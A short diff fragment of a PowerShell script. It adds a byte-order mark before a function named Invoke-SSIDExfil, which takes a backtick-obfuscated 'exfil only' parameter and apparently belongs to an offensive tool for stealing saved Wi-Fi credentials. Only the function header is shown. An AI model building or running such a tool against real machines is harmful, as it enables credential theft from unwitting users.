@@ -1,4 +1,4 @@
-function Invoke-SSIDExfil {
+﻿function Invoke-SSIDExfil {
     [CmdletBinding()]
     param(
         [switch]${eXf`iL`onLY},
